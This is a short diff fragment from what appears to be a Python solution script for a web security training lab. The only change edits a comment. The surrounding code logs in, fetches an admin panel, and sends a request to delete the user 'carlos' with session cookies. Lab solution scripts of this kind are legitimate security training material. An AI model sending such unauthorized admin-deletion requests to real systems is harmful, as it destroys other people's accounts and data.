@@ -83,7 +83,7 @@ if login.status_code == 302:
     print(Fore.WHITE + "3. Fetching the admin panel.. " + Fore.GREEN + "OK")
 
     try:  
-        # delete the carlos
+        # delete carlos
         delete_carlos = requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
         
     except:
